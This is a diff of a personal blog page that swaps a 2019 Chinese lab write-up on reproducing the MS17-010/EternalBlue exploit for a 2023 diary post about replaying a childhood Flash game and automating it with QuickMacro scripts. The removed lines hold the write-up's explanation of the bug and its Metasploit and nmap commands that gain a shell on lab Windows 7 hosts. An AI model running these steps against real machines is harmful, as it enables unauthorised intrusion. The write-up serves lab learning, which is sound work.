@@ -16,7 +16,7 @@
   <meta name="description" content="Personal Blog of Zhiyu Zhang">
   <meta name="author" content="Zhiyu Zhang">
   <meta name="keywords" content="Security, Machine Learning, Linux">
-  <title>【渗透】MS17-010漏洞复现 - Zhiyu&#39;s Blog</title>
+  <title>回味童年小记之造梦西游 - Zhiyu&#39;s Blog</title>
 
   <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
 
@@ -162,8 +162,8 @@
               
   <div class="mt-3 post-meta">
     <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-    <time datetime="2019-11-14 19:46">
-      November 14, 2019 pm
+    <time datetime="2023-05-28 21:19">
+      May 28, 2023 pm
     </time>
   </div>
 
@@ -173,7 +173,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      1.1k words
+      1.4k words
     </span>
   
 
@@ -183,7 +183,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      13
+      14
        minutes
     </span>
   
@@ -223,136 +223,62 @@
             
               <p class="note note-info">
                 
-                  Last updated on：February 18, 2023 pm
+                  Last updated on：June 5, 2023 am
                 
               </p>
             
             <article class="markdown-body">
-              <h2 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1 漏洞原理"></a>1 漏洞原理</h2><h3 id="1-1-简介"><a href="#1-1-简介" class="headerlink" title="1.1 简介"></a>1.1 简介</h3><p><strong>EternalBlue(在微软的MS17-010中被修复)是在Windows的SMB服务处理SMB v1请求时发生的漏洞，这个漏洞导致攻击者在目标系统上可以执行任意代码。</strong></p>
-<p>从EternalBlue这个Exploit被影子经纪人公布到互联网上后，就成为了“明星”。这个Exploit被多款恶意软件利用。包括肆虐的<strong>WannaCrypt</strong>，无文件的勒索软件<strong>UIWIX</strong>和SMB蠕虫<strong>EternalRocks</strong>。</p>
+              <p>回味童年小记，又名摸鱼小记</p>
 <a id="more"></a>
 
-<h3 id="1-2-漏洞简析"><a href="#1-2-漏洞简析" class="headerlink" title="1.2 漏洞简析"></a>1.2 漏洞简析</h3><p><strong>Eternalblue利用了3个不同的bug</strong></p>
+<h2 id="碎念-重温童年"><a href="#碎念-重温童年" class="headerlink" title="碎念 - 重温童年"></a>碎念 - 重温童年</h2><p>最近突然很想玩养成宠物类的游戏，还要求宠物拥有各种属性和技能，能够辅助战斗。这类游戏真不好找，首先排除口袋妖怪系列，因为在更久之前我已经重温过一遍究极绿宝石5.4了，现在正处于长草期。然后一番搜索之下，我得到了答案：造梦西游！</p>
+<p>说起来造梦西游，真的是满满的回忆，小学还有初中玩过造梦123，无论是自己玩单人模式的挑战boss的刺激感，还是和同学挤在键盘前一起玩的双人模式的兴奋感……</p>
+<img src="https://raw.githubusercontent.com/QGrain/picgo-bed/main/figure-2022/202305282130448.png" srcset="/img/loading.gif">
+
+<p>打开造2，4399真的是良心满满，居然还给我保留着十多年前的存档，造3也一样，2011年的存档依旧在，只是有些遗憾的是我已经回忆不起来当初和我一起玩双人模式的人都有谁了，也许是邻居也许是同班同学。</p>
+<p>最后综合对比了(查知乎)造1~5的玩法与风评，从玩法和可玩性上讲，造12是少于造345的；从经典性上讲造123是大于造45的；从易玩性和战力崩坏上讲，造123是还是优于造45的。所以最后还是选择了造3，重温开温！</p>
+<h2 id="新印象-这游戏是真的肝"><a href="#新印象-这游戏是真的肝" class="headerlink" title="新印象 - 这游戏是真的肝"></a>新印象 - 这游戏是真的肝</h2><p>先简单看了一下造3的存档们，发现无论单人还是双人模式等级都不高，游戏内容解锁度也都很低，果然我是萌新呀。所以不如重开新档，正好熟悉一下游戏内容，毕竟之前的记忆已经久远了。</p>
+<p>重来一遍果然发现了许多新鲜有趣的东西，比如小时候玩没加过联盟，比如有很多新出的活动和新出的宠物……还有之前不曾留意过的<strong>造梦里的数学问题：各种概率的计算</strong>，<a href="https://www.bilibili.com/read/cv9669999/" target="_blank" rel="noopener">造3装备打造方案及其计算过程</a> 这篇文章足以窥见冰山一角。</p>
+<p>还有最要命的，就是追求传说装备、饰品和法宝的极限属性。以造3两大废肝王之一的法宝 <strong>太极八卦</strong> 来举例吧</p>
+<img src="https://raw.githubusercontent.com/QGrain/picgo-bed/main/figure-2022/202305282149998.png" srcset="/img/loading.gif">
+
+<p>太极八卦有以下属性需要反复地去双开刷：</p>
 <ul>
-<li>第一个是内核态函数<strong>srv!SrvOs2FeaListToNt</strong>在处理FEA(File Extended Attributes)转换时，由于错误地使用的<strong>WORD强制类型转换</strong>，导致在大非分页池(内核的数据结构，Large Non-Paged Kernel Pool)的<strong>缓冲区溢出</strong>。</li>
-<li>第二个漏洞可以触发缓冲区溢出，这是由于SMB协议定义的两个子命令SMB_COM_TRANSACTION2和SMB_COM_NT_TRANSACT的差别。如果有太多的数据要包含在一个单独的包中，就需要_SECONDARY命令。TRANSACTION2和NT_TRANSACT的关键区别在于<strong>后者调用的数据包是前者大小的2倍</strong>。如果客户端使用NT_TRANSACT子命令在TRANSACTION2子命令前发送伪造的消息，就会出现验证错误。如果协议发现接收了2个分开的子命令，就会根据最后接收的包的类型来分配类型和大小。因为最后接收的包比较小，所以第一个包会占用比分配空间更多的空间。</li>
-<li>一旦攻击者完成初始的溢出，就可以利用SMB v1中的第3个漏洞来进行Heap Spraying(堆喷射)，导致在给定地址分配一块内存。然后，攻击者就可以写入和执行shellcode来控制系统。</li>
-</ul>
-<h2 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2 漏洞复现"></a>2 漏洞复现</h2><h3 id="2-1-渗透Windows7-32-bit"><a href="#2-1-渗透Windows7-32-bit" class="headerlink" title="2.1 渗透Windows7 32-bit"></a>2.1 渗透Windows7 32-bit</h3><h4 id="2-1-1-实验环境"><a href="#2-1-1-实验环境" class="headerlink" title="2.1.1 实验环境"></a>2.1.1 实验环境</h4><p><strong>实验平台：</strong></p>
-<ul>
-<li>带有MS17-010漏洞的Windows 7 pro x86， 内部版本7601<ul>
-<li><strong>IP：192.168.188.136</strong></li>
+<li>成长率：目标3.0，而其范围为1.6-3.0。合成材料成长率拉满为2.5+2.5+1.7的情况下，合成成长率为2.2+rand(0.1, 0.8)。目标概率为$\frac{2}{8}$</li>
+<li>五行：完美五行是金+木，而每次合成(或者重置)得到的五行一共有 $5+C_{5}^{2}&#x3D;15$ 种。目标概率为$\frac{1}{15}$</li>
+<li>基础词条(究极肝)：<ul>
+<li>暴击：目标8%，范围1~8%，样本有限我也不知道最低是多少，姑且认为最低为1%吧</li>
+<li>闪避：目标8%，范围1~8%，不知道最低是多少</li>
+<li>回血：目标28，范围1~28，不太确定有没有0</li>
+<li>回蓝：目标8，范围1~8，不太确定有没有0</li>
+<li>魔抗：目标8%，范围1~8%，不知道最低是多少</li>
+<li>词条目标概率为$\frac{1}{8} \times \frac{1}{8} \times \frac{1}{8} \times \frac{1}{28} \times \frac{1}{8} &#x3D; \frac{1}{114688}$</li>
 </ul>
 </li>
-<li>Kali Linux，用于渗透<ul>
-<li><strong>IP：192.168.188.135</strong></li>
 </ul>
+<p>所以太极八卦刷到目标极限属性的概率（草算，不具参考性）为$\frac{1}{6881280}$，恐怖至极！就算基础词条的属性下限分别为66116，目标概率也只有$\frac{1}{362880}$m，想想就肝疼   :(</p>
+<p><strong>所以啊，还得上脚本！当然是模拟操作的那种脚本，而不是修改器（那样会被踢出联盟的）</strong></p>
+<h2 id="自动化-按键精灵之Q语言速成"><a href="#自动化-按键精灵之Q语言速成" class="headerlink" title="自动化 - 按键精灵之Q语言速成"></a>自动化 - 按键精灵之Q语言速成</h2><p>如果有模拟人的键鼠操作的脚本，那么就可以将重复的刷子工作交给机器在闲暇时间来做。答案就是按键精灵。按键精灵采用的是Q语言，是基于VBScript改进的一种易学易用、功能强大的脚本语言。 </p>
+<p>然后就是为以下有重复行为的工作编写脚本：</p>
+<ul>
+<li>刷神秘店铺&#x2F;珍珠店铺（已完成）</li>
+<li>合成极品太极八卦（已完成）</li>
+<li>合成极品花宴（未完成）</li>
+<li>强化装备（未完成）</li>
+<li>药园种植潜力草（已完成）</li>
+<li>刷28星宿（已完成）</li>
+<li>…</li>
+</ul>
+<p><strong>以上脚本均开源</strong>：<a href="https://github.com/QGrain/zmxy3-auto" target="_blank" rel="noopener">QGrain&#x2F;zmxy-auto</a>。实现思路嘛，简短来说就是”模拟”，再边用边查一些Q语言的语法就行了。</p>
+<p>一些思考：</p>
+<ul>
+<li><p>显示器分辨率的适配，我这些脚本的像素级匹配都是在2K分辨率的背景下做的，那适配1080P和4K呢？</p>
+</li>
+<li><p>脚本后台化：目前脚本都是挂在前台进行的，也就是说挂机的同时不可操作电脑。即便可以在出去吃饭的时候使用或者拥有多台电脑时使用，依旧是有些不方便。但是脚本后台化简单查了一下写法，似乎有些麻烦和不稳定，所以有空再研究研究（已经摸鱼许久了orz）</p>
+</li>
+<li><p>按键精灵还能用来干什么：在端游和页游领域里自然不用说，所有重复的工作都可以搬套。那么在日常学习和科研工作领域呢？也许这种模拟式的运维可以作为API式的运维的一种替代方案吧，在有GUI的前提下。</p>
 </li>
 </ul>
-<p><strong>实验配置：</strong></p>
-<p>kali没有32位机器的渗透模块，我们需要做以下配置</p>
-<ul>
-<li><strong>安装wine 32</strong></li>
-</ul>
-<div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># root 权限</span>
-dpkg --add-architecture i386
-apt-get update
-apt-get install wine32</code></pre></div>
-
-<ul>
-<li><strong>拉取EternalBlue_Doublepulsar攻击模块</strong></li>
-</ul>
-<div class="hljs"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit
-
-<span class="hljs-comment"># 将模块拷贝到msf的相应目录</span>
-<span class="hljs-built_in">cd</span> Eternalblue-Doublepulsar-metasploit
-cp -r deps/ eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/</code></pre></div>
-
-<ul>
-<li><strong>运行postgresql</strong></li>
-</ul>
-<div class="hljs"><pre><code class="hljs bash">service postgresql start</code></pre></div>
-
-<h4 id="2-1-2-信息搜集"><a href="#2-1-2-信息搜集" class="headerlink" title="2.1.2 信息搜集"></a>2.1.2 信息搜集</h4><ul>
-<li><strong>nmap扫描</strong></li>
-</ul>
-<div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># root 权限</span>
-namp -sS -sV -Pn 192.168.188.136</code></pre></div>
-
-<p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191107174140.png" srcset="/img/loading.gif"></p>
-<p>发现该win7开放了445端口，可进一步采用msfconsole进行扫描分析</p>
-<ul>
-<li><strong>查看并使用辅助扫描模块测试目标是否可攻击</strong></li>
-</ul>
-<div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 运行msfconsole工具</span>
-msfconsole
-
-<span class="hljs-comment"># 搜索ms17-010相关模块，并采用辅助模块进行测试</span>
-search ms17-010
-
-<span class="hljs-comment"># 发现有一个ms17_010的扫描检测模块可用, use</span>
-use auxiliary/scanner/smb/smb_ms17_010</code></pre></div>
-
-<p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191109164105.png" srcset="/img/loading.gif"></p>
-<div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 设置RHOSTS项为192.168.188.136</span>
-<span class="hljs-built_in">set</span> RHOSTS 192.168.188.136
-
-<span class="hljs-comment"># 运行该ms17_010检测模块</span>
-run</code></pre></div>
-
-<p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191109164829.png" srcset="/img/loading.gif"></p>
-<p><strong>发现确实目标机器存在MS17-010，并提示可用之前git clone的DoublePulsar模块进行侵入</strong></p>
-<h4 id="2-1-3-开始渗透"><a href="#2-1-3-开始渗透" class="headerlink" title="2.1.3 开始渗透"></a>2.1.3 开始渗透</h4><ul>
-<li><strong>尝试攻击</strong></li>
-</ul>
-<div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 使用doublepulsar攻击模块</span>
-use exploit/windows/smb/eternalblue_doublepulsar
-
-<span class="hljs-comment"># 设置RHOST项为192.168.188.136</span>
-<span class="hljs-built_in">set</span> RHOST 192.168.188.136
-
-<span class="hljs-comment"># 查看攻击模块的配置，请特别注意DOUBLEPULSARPATH是否与你git clone下载的路径一致</span>
-show options</code></pre></div>
-
-<p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191109170635.png" srcset="/img/loading.gif"></p>
-<div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 运行攻击模块</span>
-run</code></pre></div>
-
-<p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191109171143.png" srcset="/img/loading.gif"></p>
-<div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 渗透并没有成功，修改PROCESSINJECT项为explorer.exe (修改为lsass.exe也可以)</span>
-<span class="hljs-built_in">set</span> PROCESSINJECT explorer.exe
-
-<span class="hljs-comment"># 再次exploit，成功</span>
-run</code></pre></div>
-
-<p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191109171502.png" srcset="/img/loading.gif"></p>
-<p><strong>meterpreter</strong>是一个为攻击者提供交互性shell以便于在目标机器上执行代码的命令行工具。渗透成功的后续攻击可以参考阅读<a href="https://qgrain.github.io/2019/11/14/%E6%B8%97%E9%80%8F-%E9%80%9A%E8%BF%87meterpreter%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83/">【渗透】meterpreter提权</a></p>
-<h3 id="2-2-渗透Windows7-64-bit"><a href="#2-2-渗透Windows7-64-bit" class="headerlink" title="2.2 渗透Windows7 64-bit"></a>2.2 渗透Windows7 64-bit</h3><p>相比于渗透Windows7 32-bit，渗透64位机器要简单得多，因为64位机器的渗透是msf内建支持的。</p>
-<p><em><strong>前几个步骤基本和渗透32位机器一致</strong></em></p>
-<h4 id="2-2-1-信息搜集"><a href="#2-2-1-信息搜集" class="headerlink" title="2.2.1 信息搜集"></a>2.2.1 信息搜集</h4><ul>
-<li><strong>nmap扫描主机信息</strong></li>
-<li><strong>msfconsole采用scanner模块扫描检测ms17-010漏洞</strong></li>
-</ul>
-<div class="hljs"><pre><code class="hljs bash">use auxiliary/scanner/smb/smb_ms17_010
-<span class="hljs-built_in">set</span> RHOSTS 192.168.188.138 <span class="hljs-comment"># Windows 7 x64</span>
-show options
-run</code></pre></div>
-
-<p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191114113425.png" srcset="/img/loading.gif"></p>
-<h4 id="2-2-2开始渗透"><a href="#2-2-2开始渗透" class="headerlink" title="2.2.2开始渗透"></a>2.2.2开始渗透</h4><ul>
-<li><strong>方法一：采用msf自带的eternalblue攻击模块</strong></li>
-</ul>
-<div class="hljs"><pre><code class="hljs bash">use exploit/windows/smb/ms17_010_eternalblue
-<span class="hljs-built_in">set</span> RHOST 192.168.188 138 <span class="hljs-comment"># Windows 7 x64</span>
-show options
-run</code></pre></div>
-
-<p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191114114152.png" srcset="/img/loading.gif"></p>
-<p>成功拿到目标机器的Shell</p>
-<ul>
-<li><strong>方法二：采用github开源攻击模块DoublePulsar</strong></li>
-</ul>
-<p>步骤和攻击32位机器一致，但是需要配置<a href>wine64和wine32共存</a></p>
 
             </article>
             <hr>
@@ -362,7 +288,7 @@ run</code></pre></div>
                   <div class="post-meta mr-3">
                     <i class="iconfont icon-category"></i>
                     
-                      <a class="hover-with-bg" href="/categories/Security/">Security</a>
+                      <a class="hover-with-bg" href="/categories/Diary/">Diary</a>
                     
                   </div>
                 
@@ -370,11 +296,9 @@ run</code></pre></div>
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/Penetration/">Penetration</a>
+                      <a class="hover-with-bg" href="/tags/Game/">Game</a>
                     
-                      <a class="hover-with-bg" href="/tags/CVE/">CVE</a>
-                    
-                      <a class="hover-with-bg" href="/tags/Bug/">Bug</a>
+                      <a class="hover-with-bg" href="/tags/QuickMacro/">QuickMacro</a>
                     
                   </div>
                 
@@ -387,18 +311,12 @@ run</code></pre></div>
                   <div class="post-prev col-6">
                     
                     
-                      <a href="/2019/11/14/渗透-meterpreter命令详解/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">【渗透】meterpreter命令详解</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </div>
                   <div class="post-next col-6">
                     
                     
-                      <a href="/2019/10/22/Iptables-1/">
-                        <span class="hidden-mobile">Iptables(1)</span>
+                      <a href="/2023/05/08/syzkaller原理与理解/">
+                        <span class="hidden-mobile">syzkaller原理与理解</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -650,7 +568,7 @@ run</code></pre></div>
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "【渗透】MS17-010漏洞复现&nbsp;",
+        "回味童年小记之造梦西游&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 80,
